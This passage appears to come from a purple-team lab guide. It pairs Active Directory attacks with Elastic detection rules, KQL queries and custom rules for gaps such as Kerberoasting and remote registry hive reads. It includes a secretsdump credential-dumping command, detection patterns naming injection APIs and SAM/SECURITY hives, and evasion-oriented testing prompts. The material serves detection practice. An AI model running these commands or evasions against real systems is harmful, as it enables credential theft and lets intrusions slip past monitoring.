event.code:"4104" AND powershell.file.script_block_text:(*VirtualAlloc* OR *WriteProcessMemory* OR *CreateRemoteThread* OR *OpenProcess* OR *NtCreateThreadEx*)
```

### What the Rule Checks

The **Suspicious Windows PowerShell Arguments** rule fires on process creation events where `powershell.exe` is executed with command-line arguments matching known offensive patterns. It checks for:

- Encoded commands (`-enc`, `-EncodedCommand`) combined with suspicious parent processes
- Download cradle strings in arguments (`DownloadFile`, `DownloadString`, `Net.WebClient`)
- AMSI bypass strings
- Base64 blobs in the command line
- Specific cmdlet sequences associated with offensive tooling

The **Potential Process Injection via PowerShell** rule operates on Script Block Logging (Event ID 4104) rather than process creation. It checks the decoded script block content for combinations of Win32 API calls that indicate process injection: memory allocation functions (`VirtualAlloc`, `VirtualAllocEx`) combined with write functions (`WriteProcessMemory`) combined with execution functions (`CreateRemoteThread`, `NtCreateThreadEx`) or dynamic resolution functions (`GetProcAddress`, `GetModuleHandle`).

This is a critical distinction: Script Block Logging captures the **decoded content** of the PowerShell script, regardless of how it was delivered (encoded, obfuscated, downloaded, or typed interactively). Base64 encoding provides zero opsec value against Script Block Logging because the decoded script is logged at execution time.

### Opsec Considerations

These are open-ended questions to drive your own testing, this is not a bypass guide.

- If Script Block Logging is enabled, encoding and obfuscation are transparent to the 4104 event. The decoded script block text contains the actual code. Research what layer of the detection stack obfuscation actually targets (hint: it targets signature-based file scanning and command-line logging, not runtime script logging).
- Compare running `powershell.exe` versus `pwsh.exe` (PowerShell 7, if available). Some detection rules reference `powershell.exe` by name. Research whether the prebuilt rules also cover `pwsh.exe`.
- What happens if you load the `System.Management.Automation` .NET assembly in a custom host process (not named `powershell.exe`)? The process creation rule would not match, but Script Block Logging still fires because it hooks the PowerShell engine, not the process name. Verify this in your lab.
- Research the difference between `process.args` (which contains the raw command-line arguments) and `powershell.file.script_block_text` (which contains the decoded runtime content). A rule that matches on `process.args` can be evaded by moving the suspicious content out of the command line (into a file, a download, or a variable). A rule that matches on script block text cannot.

### Iteration Prompt

Run three variants: (1) an encoded command with a download cradle, (2) the same download cradle written directly on the command line without encoding, and (3) the download cradle placed in a `.ps1` file and executed with `powershell -File script.ps1`. For each, document which rules fire and which Discover queries return results. Map the difference to the data source each rule relies on (process creation vs Script Block Logging).

---

## Scenario 8: Remote Credential Dumping via secretsdump

**MITRE ATT&CK:** T1003.002 OS Credential Dumping: Security Account Manager, T1003.004 OS Credential Dumping: LSA Secrets

This scenario covers `impacket-secretsdump` targeting the SAM and LSA Secrets of a remote host (not DCSync mode, which is Scenario 3). The attack reads the SAM, SYSTEM, and SECURITY registry hives over SMB.

### Prebuilt Rules to Enable

| Rule Name | Rule Type | Data Source |
|-----------|-----------|-------------|
| Suspicious Service was Installed in the System | KQL | Windows Security (Event ID 7045, 4697) |
| Suspicious Lsass Process Access | EQL | Sysmon (Event ID 10) |

`impacket-secretsdump` in default (non-DCSync) mode creates a temporary service on the target to dump the registry hives. This triggers the service installation rule. If it also touches LSASS for LSA secrets or cached credentials, it may trigger the LSASS access rules from Scenario 1.

### Attack Execution

```bash
impacket-secretsdump <domain>/<user>:<password>@10.1.10.22
```

![secretsdump registry hive dump](https://cdn-images-1.medium.com/max/800/1*xLvPKi1gLDK2RT9h1dHVOw.png)
*Domain dump*

Without the `-just-dc` flag, this performs:

- Remote registry read of SAM, SYSTEM, SECURITY hives via the RemoteRegistry service.
- LSA secret extraction.
- Cached domain credential extraction.

### KQL Confirmation Query

**Service installation by secretsdump:**

```kql
event.code:"7045"
```

Check for the remote registry service being started:

```kql
event.code:"7036" AND winlog.event_data.param1:"Remote Registry"
```

Registry hive access (if Sysmon registry events are captured):

```kql
event.code:"13" AND winlog.event_data.TargetObject:(*\\SAM OR *\\SECURITY OR *\\SYSTEM)
```

Network logon from attacker IP:

```kql
event.code:"4624" AND winlog.event_data.LogonType:"3" AND source.ip:"198.51.100.3"
```

### What the Rule Checks

The **Suspicious Service was Installed in the System** rule fires if `impacket-secretsdump` creates a service whose ImagePath matches any of the suspicious patterns (such as `RemComSvc` or paths containing `cmd.exe`). The specific service creation behavior depends on the impacket version and configuration.

Note that `impacket-secretsdump` can also operate **without** creating a service if the RemoteRegistry service is already running on the target. In that case, the service installation rule will **NOT** fire. The telemetry shifts to registry access events and network logon events, which may not have dedicated prebuilt rules.

### Opsec Considerations

These are open-ended questions to drive your own testing, this is not a bypass guide.

- Compare the detection footprint of secretsdump with and without the `-just-dc` flag. Without it: service creation + registry hive reads. With it: DCSync (Scenario 3). They are fundamentally different code paths with different detection surfaces.
- Test whether the RemoteRegistry service is already running on your GOAD-Light hosts. If it is, secretsdump may skip the service creation step entirely. What telemetry remains?
- The registry hive reads (SAM, SYSTEM, SECURITY) are the core action. Research whether any Elastic prebuilt rule specifically monitors for remote registry hive reads, or if this is a detection gap you need to fill with a custom rule.
- `impacket-secretsdump` supports the `-exec-method` flag, which controls how the temporary service is created (smbexec, wmiexec, mmcexec). Test different exec methods and compare the service installation events.

### Iteration Prompt

Run secretsdump with default settings and note every alert that fires. Then run it again after manually starting the RemoteRegistry service on the target (`sc start RemoteRegistry`). Compare the two alert sets. Document what is missing in the second run and write a KQL query to catch the gap.

---

## Building Custom Rules for Detection Gaps

After working through multiple scenarios of your own, you should have a list of techniques that produced raw telemetry in Discover but did **NOT** trigger any prebuilt alert. These are **detection gaps**. Filling them with custom rules is the purple team practice loop.

### Gap 1: Kerberoasting

Kerberoasting produces Event ID 4769 (TGS request) with RC4 encryption. No prebuilt Elastic rule fires on this in a standard Defend + Sysmon configuration. Build a custom rule:

**KQL for custom rule:**

```kql
event.code:"4769" AND winlog.event_data.TicketEncryptionType:"0x17" AND NOT winlog.event_data.ServiceName:*$
```

This filters for TGS requests using RC4 encryption (0x17) while excluding computer account service names (which commonly request RC4 tickets for legitimate reasons). Consider adding a threshold condition (for example, more than 3 matching events from the same source within 5 minutes) to reduce false positives.

### Gap 2: AS-REP Roasting

AS-REP roasting produces Event ID 4768 (TGT request) without preauthentication. Build a custom rule:

**KQL for custom rule:**

```kql
event.code:"4768" AND winlog.event_data.PreAuthType:"0"
```

If the `PreAuthType` field is not populated in your Elastic ingest pipeline, use the encryption type angle:

```kql
event.code:"4768" AND winlog.event_data.TicketEncryptionType:"0x17" AND NOT winlog.event_data.TargetUserName:*$
```

### Gap 3: Remote Registry Hive Read

`secretsdump` without DCSync reads SAM/SYSTEM/SECURITY hives remotely. Build a custom rule if no prebuilt coverage exists:

**KQL for custom rule** (requires Sysmon Event ID 13 or registry auditing):

```kql
event.code:"13" AND winlog.event_data.TargetObject:(*\\SAM OR *\\SECURITY) AND winlog.event_data.EventType:"SetValue"
```

### Gap 4: NTLM Logon from Non-Standard Source

Detect network logons using NTLM authentication from IPs that are not domain controllers:

**KQL for custom rule:**

```kql
event.code:"4624" AND winlog.event_data.LogonType:"3" AND winlog.event_data.AuthenticationPackageName:"NTLM" AND NOT source.ip:("10.1.10.10" OR "10.1.10.11")
```

This is useful as a secondary indicator for lateral movement techniques that use NTLM pass-the-hash.

### How to Create a Custom Rule in Kibana

1. Go to **Security > Rules > Create new rule**.
2. Select "Custom query" as the rule type.
3. Paste your KQL query.
4. Set the time window (for example, 5 minutes) and threshold if applicable.
5. Give it a descriptive name and map it to the appropriate MITRE ATT&CK technique ID.
6. Enable the rule.
7. Revert to your clean snapshot, run the attack again, and confirm the custom rule fires.
8. Run legitimate operations and confirm it does **NOT** fire (false positive check).
9. Try to modify the attack to evade your own rule. If you succeed, your rule has a gap. Tighten it.

You can export Elastic rules as NDJSON from the Rules page and version-control them in Git alongside your Obsidian notes. This makes them portable and reproducible.

---

## Suggested Practice Approach I'd Follow

This is a structured approach for working through the scenarios.

1. **Establish baselines.** Run Scenarios 1 through 4 in their default, noisy form. Do not try to be quiet. The goal is to verify that the prebuilt rules fire, document the alert details, and build notes with the rule names, event IDs, and KQL queries for each detection.
2. **Test modifications and expand.** Rerun Scenarios 1 through 4 with one opsec modification per run (change the tool, timing, scope, or execution context). Only change one variable at a time. Then work through Scenarios 5 through 8. Document what changed in the detection output.
3. **Custom rules and adversarial iteration.** Pick two or three detection gaps from your notes (Kerberoasting, AS-REP roasting, registry hive reads, or others you discovered). Build custom rules for them. Then attempt to evade your own rules. Document the results.
4. **Ongoing.** As you encounter new techniques in CTFs, training, studying or real engagements, add them to the lab. The workflow is always the same: snapshot, enable rules, attack, observe, note, revert, modify, repeat.

---

## Thoughts

The shift from vailla penetration testing-level work to detection-aware operations is not about learning new attacks. You already know the attacks. The shift is learning to think in terms of telemetry: what events does this action produce, where do those events go, what rules are watching for them, and what conditions must be true for the rule to fire.

Once you internalize that, evasion becomes an engineering problem: given the detection logic, which input parameters can you control, and which changes produce a different detection outcome?

This lab gives you a repeatable, fully instrumented environment to practice exactly that. Every snapshot revert is a fresh attempt. Every Kibana query is a feedback signal.
